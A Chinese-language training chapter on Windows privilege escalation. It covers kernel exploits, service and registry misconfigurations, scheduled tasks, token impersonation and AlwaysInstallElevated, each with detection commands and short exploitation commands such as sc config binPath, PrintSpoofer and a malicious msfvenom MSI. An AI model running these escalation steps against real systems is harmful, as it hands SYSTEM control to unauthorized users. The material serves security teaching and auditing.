# Windows 提权方法

### 4.1 内核漏洞提权

**原理**

内核漏洞是指操作系统内核中的漏洞，利用这些漏洞可以从用户态提升到内核态（SYSTEM 权限）。内核漏洞通常是最严重的本地提权漏洞。

**常见内核漏洞类型**

1. **缓冲区溢出**：内核驱动中的栈/堆溢出
2. **释放后使用（UAF）**：内核对象释放后使用
3. **竞态条件**：内核中的 TOCTOU 漏洞
4. **类型混淆**：内核对象类型混淆
5. **整数溢出**：内核中的整数溢出导致缓冲区溢出

**著名内核提权漏洞**

| 漏洞编号 | 影响系统 | 类型 | 描述 |
|----------|----------|------|------|
| MS15-051 | Windows 7/8/2008/2012 | 内核漏洞 | win32k.sys 中的漏洞 |
| MS16-032 | Windows 7-10/2008-2012 | 内核漏洞 | Secondary Logon 服务漏洞 |
| CVE-2018-8120 | Windows 7/2008 | 内核漏洞 | win32k.sys 空指针解引用 |
| CVE-2019-1458 | Windows 7-10/2008-2019 | 内核漏洞 | win32k.sys UAF |
| CVE-2021-31956 | Windows 10/Server | 内核漏洞 | win32k.sys UAF |
| CVE-2023-32019 | Windows 10-11/Server | 内核漏洞 | 内核信息泄露 + 提权 |

**提权检测工具**

```powershell
# Windows Exploit Suggester - Next Generation
# https://github.com/bitsadmin/wesng

# 使用 systeminfo 收集系统信息
systeminfo > systeminfo.txt

# 使用 wes.py 检测缺失补丁
python wes.py systeminfo.txt

# PowerShell 版本的提权检测
# Sherlock - https://github.com/rasta-mouse/Sherlock
Import-Module Sherlock.ps1
Find-AllVulns

# WinPEAS - 全面的提权枚举
# https://github.com/carlospolop/PEASS-ng
```

**提权利用示例（MS16-032）**

```powershell
# MS16-032 利用示例（Invoke-MS16032）
# 该漏洞存在于 Secondary Logon 服务中
# 当进程以受限令牌运行时，可以利用此漏洞提升到 SYSTEM

# 加载 PowerShell 模块
Import-Module .\Invoke-MS16032.ps1

# 执行提权，以 SYSTEM 运行命令
Invoke-MS16032 -Command "cmd.exe /c whoami > C:\temp\result.txt"
```

### 4.2 服务权限配置错误

**原理**

Windows 服务通常以 SYSTEM 或高权限账户运行。如果服务的可执行文件路径、服务配置或注册表权限配置不当，普通用户可能可以修改服务配置，从而以高权限执行代码。

**常见服务提权场景**

**场景1：服务可执行文件路径可写**

```
如果服务的可执行文件（.exe）所在目录或文件本身可被普通用户写入：
1. 替换服务可执行文件为恶意程序
2. 重启服务（或等待系统重启）
3. 恶意程序以服务账户权限（通常是 SYSTEM）运行
```

**场景2：服务路径未加引号（Unquoted Service Path）**

```
服务路径示例：
C:\Program Files\My Service\service.exe

如果路径没有引号，Windows 会按以下顺序查找可执行文件：
1. C:\Program.exe
2. C:\Program Files\My.exe
3. C:\Program Files\My Service\service.exe

如果攻击者能在 C:\ 根目录写入 Program.exe，服务启动时会执行该文件。
```

**检测方法**

```powershell
# 检测未加引号的服务路径
Get-WmiObject -Class Win32_Service | 
    Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like "* *" } | 
    Select-Object Name, PathName, StartName

# 使用 wmic 命令
wmic service get name,pathname,startname | findstr /i /v """ | findstr /i " "

# 检测可写的服务目录
# 使用 accesschk（Sysinternals）
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwdq "C:\Program Files\"
```

**场景3：服务配置可修改**

```
如果普通用户有权修改服务配置（如 ChangeConfig 权限）：
1. 修改服务的 binPath 指向恶意程序
2. 修改服务的启动类型为自动
3. 重启服务或等待重启
```

**利用示例**

```powershell
# 检查当前用户对服务的权限
sc sdshow <ServiceName>

# 修改服务可执行路径（需要权限）
sc config <ServiceName> binPath= "C:\temp\malware.exe"

# 重启服务
sc stop <ServiceName>
sc start <ServiceName>
```

### 4.3 注册表权限配置错误

**原理**

注册表存储了 Windows 系统和应用程序的大量配置信息。如果某些注册表键的权限配置不当，普通用户可能可以修改敏感配置，从而实现权限提升。

**常见注册表提权场景**

**场景1：服务注册表键可写**

```
服务配置存储在：HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
如果该键对普通用户可写，可以：
1. 修改 ImagePath 值指向恶意程序
2. 修改 Type 改变服务类型
3. 重启服务后以 SYSTEM 执行代码
```

**场景2：启动项注册表键可写**

```
常见启动项位置：
- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
- HKCU\Software\Microsoft\Windows\CurrentVersion\Run（当前用户权限）

如果 HKLM 下的启动项键可写，添加的程序会在用户登录时以用户权限执行。
如果添加的程序在管理员登录时执行，则获得管理员权限。
```

**场景3：映像劫持（IFEO）**

```
注册表位置：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\

如果可以在此键下创建子键，可以设置 Debugger 值：
当目标程序启动时，会先启动 Debugger 指定的程序
如果目标程序以高权限运行，则 Debugger 程序继承高权限
```

**检测方法**

```powershell
# 检查可写的注册表键
# 使用 accesschk
accesschk.exe /accepteula -kvu "Authenticated Users" "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
accesschk.exe /accepteula -kvu "Authenticated Users" "HKLM\SYSTEM\CurrentControlSet\Services"

# PowerShell 检查注册表权限
Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | 
    Select-Object -ExpandProperty Access |
    Where-Object { $_.IdentityReference -match "Users|Authenticated Users" -and $_.RegistryRights -match "Write|FullControl" }
```

### 4.4 计划任务提权

**原理**

计划任务（Scheduled Tasks）是 Windows 的定时执行功能。如果计划任务配置不当，普通用户可能可以利用计划任务提升权限。

**常见计划任务提权场景**

**场景1：任务可执行文件可写**

```
如果计划任务执行的程序或脚本可被普通用户修改：
1. 替换任务执行的脚本/程序
2. 等待任务触发执行
3. 以任务配置的账户权限执行代码
```

**场景2：任务可被修改**

```
如果普通用户有修改计划任务的权限：
1. 修改任务的执行程序或参数
2. 修改任务的运行账户
3. 手动触发任务执行
```

**检测方法**

```powershell
# 列出所有计划任务
Get-ScheduledTask | Select-Object TaskName, TaskPath, State, Author

# 查看任务详情（包括执行的操作和运行账户）
Get-ScheduledTask -TaskName "<TaskName>" | Get-ScheduledTaskInfo
Get-ScheduledTask -TaskName "<TaskName>" | Select-Object -ExpandProperty Actions

# 使用 schtasks 命令
schtasks /query /fo LIST /v

# 检查任务文件权限
# 任务文件存储在：C:\Windows\System32\Tasks\
Get-Acl "C:\Windows\System32\Tasks\<TaskName>"
```

**利用示例**

```powershell
# 检查任务操作和运行账户
$task = Get-ScheduledTask -TaskName "VulnerableTask"
$task.Actions  # 查看执行的程序
$task.Principal.UserId  # 查看运行账户

# 修改任务（需要权限）
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\temp\result.txt"
Set-ScheduledTask -TaskName "VulnerableTask" -Action $action

# 立即运行任务
Start-ScheduledTask -TaskName "VulnerableTask"
```

### 4.5 令牌窃取与 AlwaysInstallElevated

**令牌窃取**

```
令牌窃取（Token Stealing）是指获取高权限进程的访问令牌，
然后用该令牌创建新进程，从而继承高权限。

常见场景：
1. SeDebugPrivilege 权限 - 可以调试任何进程，窃取其令牌
2. SeImpersonatePrivilege 权限 - 可以模拟客户端令牌
3. 服务账户权限 - 服务账户常具有这些特权
```

**Juicy Potato / PrintSpoofer 提权**

```
利用 SeImpersonatePrivilege 权限的提权工具：
- Juicy Potato：通过 COM 对象模拟 SYSTEM 令牌
- PrintSpoofer：利用打印后台处理程序服务的命名管道模拟 SYSTEM

使用条件：
- 当前账户具有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
- 常见于 IIS APPPOOL、服务账户等

示例：
PrintSpoofer.exe -i -c cmd.exe
# 以 SYSTEM 权限启动 cmd.exe
```

**AlwaysInstallElevated 提权**

```
如果以下两个注册表键都设置为 1：
- HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
- HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

则任何用户都可以以 SYSTEM 权限安装 MSI 包。

检测：
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

利用：
1. 使用 msfvenom 生成恶意 MSI
2. msiexec /quiet /qn /i malicious.msi
```

---

---

## 📋 内容审核与补充建议

> 针对「Windows 提权方法」部分的内容审核结果：

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
